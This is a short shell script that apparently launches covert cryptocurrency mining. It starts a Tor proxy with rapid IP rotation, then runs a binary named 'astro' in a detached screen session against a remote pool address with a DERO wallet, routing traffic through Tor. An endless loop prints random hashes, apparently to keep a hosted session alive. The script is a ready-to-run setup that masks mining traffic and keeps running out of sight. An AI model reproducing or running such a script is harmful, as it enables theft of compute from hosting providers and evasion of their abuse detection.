udocker run -p 127.0.0.1:9050:9050 timms/tor-proxy-rapid-ip-rotation &
sleep 2m
screen -dmS my ./astro -r 45.86.230.214:443 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.IDX -p rpc -sock-address 127.0.0.1:9050
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
